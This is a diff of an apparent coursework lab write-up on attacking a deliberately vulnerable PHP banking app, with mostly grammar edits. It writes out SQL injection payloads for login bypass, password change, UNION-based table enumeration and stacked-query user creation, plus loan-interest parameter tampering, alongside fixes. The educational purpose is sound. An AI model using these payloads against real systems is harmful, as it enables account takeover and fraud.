@@ -1,14 +1,14 @@
 ### Exercise 1: Setup
 
-1. Installed MySQL and PHP 5.6.40
-2. unzipped the contents in web root directory `/var/www/html`
+1. Install MySQL and PHP 5.6.40.
+2. unzipped the contents in web root directory `/var/www/html`.
 3. Changed the `config.php` with valid db credentails and directory for web access.
-4. Imprted the vbank.sql into the database
+4. Import the vbank.sql into the mysql database using the command below
 
     ```sql
     mysql -u root -p vbank < vbank.sql
     ```
-5. Application works as expected.
+5. Application should work as expected.
 
 
 
@@ -23,7 +23,7 @@ __1 : Identify a mechanism which protects the login process (not on the server) 
 briefly describe the general security problem with this implementation.__  
 
 __Solution:__   
--   The client side script restricts the user input to avoid any kind of injection or malicious payload that can be entered through the input form.
+-   The client-side validation imposes validation on input forms through JavaScript, Which prevents users to perform any kind of injection or insert malicious payload.
 The following check is responsible for validation:
 
 
@@ -54,33 +54,33 @@ function checkform() {
 
 
 __Security problem :__
-- Client can disable javascript to avoid validation, which can cause the application to allow  malicious payload and bypass the restriction imposed by the application
-- The payload is sent using GET request (which can be observed from network tab)
+- A client can disable javascript to avoid validation, which can cause the application to allow malicious payload and bypass the restriction imposed by the application.
+- The payload is sent using GET request (which can be observed from the network tab).
 
 ```php
 GET /htdocs/login.php?username=alex&password=test123
 ```
 
-The above request can be captured and replayed without the need to enter the input in the form, which bypasses the imposed restriction
+The above request can be captured and replayed without the need to enter the input in the form, which bypasses the imposed restriction.
 
 
 
 __2.__    
-    - __Step 1:__ capture the URL on login page on submit  
-    - __Step 2:__ modify the parameters (`username` and `password`) and submit through   browser or web proxy(in our case- ___burpsuite___)  
+    - __Step 1:__ capture the URL on login page on submit.  
+    - __Step 2:__ modify the parameters (`username` and `password`) and submit through   browser or web proxy(in our case- ___burpsuite___).  
     - __Step 3:__ send the request from the burpsuite and reload the page.
     - Payload used:    
 
 ```php
 /htdocs/login.php?username=alex'%23&password=test123
 ```
-> `%23` represents `#` to comment the succeding parameters
+> `%23` represents `#` to comment the succeding parameters.
 
 
 ![validation-bypass](assets/validation_bypass.PNG)
 
 3. __Better solution:__
-    - Validate the user input on the server side and return if input is other than the whitelisted characters  
+    - Validate the user input on the server-side and return if the input is other than the whitelisted characters.  
 
     __Replace:__
     ```php
@@ -103,7 +103,7 @@ __2.__
     }
     ```
 
-- `mysql_real_escape_string()` can be also be used while inserting into the mysql
+- `mysql_real_escape_string()` can be also be used while inserting into the mysql.
 
 E.g:  
 ```php
@@ -131,7 +131,7 @@ Query:
 ```sql
 $sql = "SELECT * FROM " . $htbconf['db/users'] . " where " . $htbconf['db/users.username'] . "='$username' and " . $htbconf['db/users.password'] . "='$password'";
 ```
-- The above query can be exploited by 
+- The above query can be exploited by:
 ```sql
  "SELECT * FROM " . $htbconf['db/users'] . " where " . $htbconf['db/users.username'] . "='testuser'  and " . $htbconf['db/users.password'] . "='testpass' or '1'='1'";
 ```
@@ -146,13 +146,13 @@ Why is your attack successful? & which checks and mechanisms can prevent this
 failure (mention at least two mechanisms).__
 __Solution:__
 
-- send the request modifying the get parameters  
+- send the request modifying the get parameters. 
 ```php
 GET /htdocs/login.php?username=testuser&password=testpass'+or+'1'='1 
 ```
 
 - Prevention
-    - Validate user input on server side
+    - Validate user input on server-side.
     - use parameterized queries.
         - Example  
         ```sql
@@ -168,20 +168,20 @@ __3. Change the password of the user you are logged in with. Briefly describe yo
 actions and indicate the source code allowing for this attack.__  
 
 __Solution:__  
-**step 1**: find the page that is responsible for password change
+**step 1**: find the page that is responsible for changing a password.
     
 ```bash 
     $ grep -Ril "not changed"                              
     htbchgpwd.page
 ```  
 
-**step 2:** Find query responsible for password change
+**step 2:** Find the query responsible for changing a password.
 ```php
 
     $sql="SELECT ".$htbconf['db/users.password']." FROM ".$htbconf['db/users']." where ". $htbconf['db/users.id']."='".$_SESSION['userid']."' and ". $htbconf['db/users.password']."='".$http['oldpwd']."'";
 ```
- - query used to exploit (payload is part of form data)
- - Exploited using blind sql same way as in login page  
+ - query used to exploit (payload is part of form data).
+ - Exploited using blind sql same way as in the login page.  
 
  ```php
     oldpwd=test'%20or%20'1'='1&newpwd1=test123&newpwd2=test123&submit=Submit
@@ -189,19 +189,19 @@ __Solution:__
 
 __4. Change the password of a known user (you know the login name of the user)!__
 __Solution:__ 
-- Navigate to `Change password`
-- Enter `Old password` and `New password` fields
-- Capture the request
+- Navigate to `Change password`.
+- Enter `Old password` and `New password` fields.
+- Capture the request.
 - Change the form data to
 
 ```php
     oldpwd=test'%20or%20'1'='1&newpwd1=test1234&newpwd2=test1234&submit=Submit
  ```
- - Forward the request  .
+ - Forward the request.
 
  ![password_change_success](assets/password_change_success.PNG)
 
- - Password has been successfully changed
+ - Password has been successfully changed.
 
 
 <br>
@@ -214,12 +214,12 @@ __1. Briefly describe how did you retrieve the information you need to create a 
 user.__
 
 __Solution:__
-- To create a new user, we need to find the table name and column names
+- To create a new user, we need to find the table name and column names.
 
 
-- Perform a UNION SELECT operation on login paramaters
-- __step 1:__ Capture the request in burp on login submit 
-- __step 2:__ send to repeater and change the request parameters as shown below to determine the number of columns  
+- Perform a UNION SELECT operation on login paramaters.
+- __step 1:__ Capture the request in burp on login submit. 
+- __step 2:__ send to repeater and change the request parameters as shown below to determine the number of columns.  
 
     ```sql
         ' UNION SELECT NULL,NULL,NULL,NULL#
@@ -241,13 +241,13 @@ __Solution:__
     ```php
     GET /htdocs/login.php?username=alex%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&password=test123 
     ```
-> **Note**: The above url is encoded before sending
+> **Note**: The above url is encoded before sending.
 
-> The decode request is 
+> The decode request is:
     ```php  
     GET/htdocs/login.php?username=alex' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#&password=test123
     ```
-- __step 3:__ use the following request(added payload) to retrieve table names (encode the parameters to avoid bad request)
+- __step 3:__ use the following request(added payload) to retrieve table names (encode the parameters to avoid bad request):
   
     ```php
          GET /htdocs/login.php?username=alex' and 1=2 union select 1,2,group_concat(table_name),4,5,6,7,8 from information_schema.tables where table_schema = database()#&password=test123
@@ -255,9 +255,9 @@ __Solution:__
 
     ![table_names](assets/table_names.png)
 
-- __step 4:__ Retrive column names
+- __step 4:__ Retrive column names.
 
-    Payload used
+    Payload used:
 
     ```php
         GET /htdocs/login.php?username=alex'and 1=2 union select 1,2,3,group_concat(column_name),5,6,7,8 from information_schema.columns where table_schema = database() and table_name ='users'#&password=test123 
@@ -269,7 +269,7 @@ __2. Briefly describe the actions required to create a new user.__
 
 __solution__ 
 - Since tablename, column names are known, append to the login request by terminating the username query and by inserting the new user query.
-    payload used
+    payload used:
 
     ```php
         GET /htdocs/login.php?username=alex'; INSERT INTO users(id, username, password,name,firstname) VALUES(99999,"charlie", "password123", 'charlie','chaplin')#&password=asd&password=test123
@@ -289,28 +289,19 @@ injection.__
 __Solution :__  
 - stored procedures 
 - ```php
-        function get_result(\mysqli_stmt $statement){
-            $result = array();
-            $statement->store_result();
-            for ($i = 0; $i < $statement->num_rows; $i++)
-            {
-                $metadata = $statement->result_metadata();
-                $params = array();
-                while ($field = $metadata->fetch_field())
-                {
-                    $params[] = &$result[$i][$field->name];
-                }
-                call_user_func_array(array($statement, 'bind_result'), $params);
-                $statement->fetch();
-            }
-            return $result;
-        }
+    if ($stmt = $link->prepare("SELECT id,password,username,name,firstname,time,lasttime,lastip from users where username =? and password=?")) {   
+    	$stmt->bind_param("ss", $username,$password);
+   	$stmt -> execute();
+	$stmt -> store_result();
+	$stmt -> bind_result($id,$password,$username,$name,$firstname,$time,$lasttime,$lastip);
+	}
+
     ```
 
 
-- Perform sql injection with the same payload as before
-- Submit the request
-- Application throws error message, after adding the stored procedures tio prevent sql injection
+- Perform sql injection with the same payload as before.
+- Submit the request.
+- Application throws error message, after adding the stored procedures to prevent sql injection.
 - __Result:__
 
 ![sql_fixed](assets/sql_fixed.PNG)
@@ -332,22 +323,22 @@ __2. Briefly describe the steps to request a loan from your victim will benefit_
 __Solution__
 
 - __step 1:__ configure web browser(change proxy settings) with burpsuite to intercept requests.
-- __step 2:__ Turn on the intercpt in burp `proxy`. 
+- __step 2:__ Turn on the intercept in burp `proxy`. 
 - __step 3:__ Go to ***Request a loan*** page and enter the required details and submit the request.
-> As the request is clicked burpsuite should intercept the request
+> As the request is clicked burpsuite should intercept the request,
 
 ![request_loan_intercept](assets/request_loan_intercept.PNG)  
 
-- __step 4:__ Modify  the Interest parameter from 4.2 to -4.2 (can be chnaged to whatever we want)  
+- __step 4:__ Modify the interest parameter from 4.2 to -4.2 (can be chanaged to whatever we want).  
 
 ![request_loan_intercept_tampered](assets/request_loan_intercept_tampered.png)  
 
-- __step 5:__ forward the request. And Turn off the burp proxy
-- __step 6:__ Modified Interest rate can be seen on `Loan Request confirmation`. Click `confirm`.  
+- __step 5:__ forward the request. And turn off the burp proxy.
+- __step 6:__ Modified interest rate can be seen on `Loan Request confirmation`. Click `confirm`.  
 
 ![loan_confirm](assets/loan_confirm.PNG)    
 
-- Loan sucess can be seen (Ignore the error messages)
+- Loan success can be seen (Ignore the error messages).
 
 ![loan_sucess](assets/loan_sucess.PNG)  
 
@@ -359,10 +350,10 @@ __Solution__
 __3. What enables this type of attack? Identify the respective source code and give
 the vulnerability a name.__
 
-__solution:__ Failing to server side validation of received parameters allow the attacker to modify the request and successfully execute.
-Although adding client side validation have nos ignificant effect as this can be bypassed too.
+__solution:__ Failing to validate the received parameters on server-side allows the attacker to modify the request and execute successfully.
+Although adding client-side validation have no significant effect as this can be bypassed too.
 
-- code responsible for allowing the attack
+- code responsible for allowing the attack:
 
  ```php
 	if(isset($http['submit']) && $http['submit'] == "Confirm") {
@@ -378,8 +369,8 @@ Although adding client side validation have nos ignificant effect as this can be
 
  ```
 
- - As we can see the received data is used to query using mysql without validatng.
- - Akthough there is a validation on loan amount, which is not effective in stopping the attack.
+ - As we can see the received data is used in mysql query without validating.
+ - Although there is a validation on loan amount, which is not effective to preventing the attack.
 
 ```php
 	if(!$http['loan'] || $http['loan'] <= 0) {
@@ -390,7 +381,7 @@ Although adding client side validation have nos ignificant effect as this can be
 ```
 
 
-- Vulnerability Name : **Paramater Tampering Vulnerability**  
+- Vulnerability name : **Paramater Tampering Vulnerability**  
 
   
 __4. Show how to fix this vulnerability. Implement your patch and briefly summarize
@@ -398,8 +389,8 @@ your changes.__
 
 __Solution:__
 
-- Using server side validations on all input data
-- Following validations will fix the vulnerability.  
+- Using server-side validations on all input data.
+- Following validations will fix the vulnerability: 
 
 ```php
 	if(!$http['interest'] || !$http['interest'] != 4.2){
@@ -427,7 +418,7 @@ __Solution:__
 ### Exercise 6: Cross Site Scripting - XSS
 
 __1. Briefly explain what is an XSS attack in your own words?__
-__Solution:__ Cross site scripting is a web vulnerability, where untrusted useer input is processed without sanity checks,  allowing  malicous scripts to be injected in to the application.
+__Solution:__ Cross-site scripting is a web vulnerability, where untrusted user input is processed without sanity checks,  allowing malicious scripts to be injected into the application.
 
 __2. Perform an XSS attack that opens a window with a nice message while another
 user uses his account. Briefly describe the required actions.__
@@ -449,7 +440,7 @@ __Solution:__
 
 __3. What obvious checks did the developers miss to apply?__  
 
-__Solution:__ User input is processed without validating(both on client and server side) and stored, allowing the attacker to execute the payload.
+__Solution:__ User input is processed without validating (both on client and server-side) and stored, allowing the attacker to execute the payload.
 
 
 __4. Identify the respective source code and eliminate the vulnerability(ies). Briefly summarise your changes.__
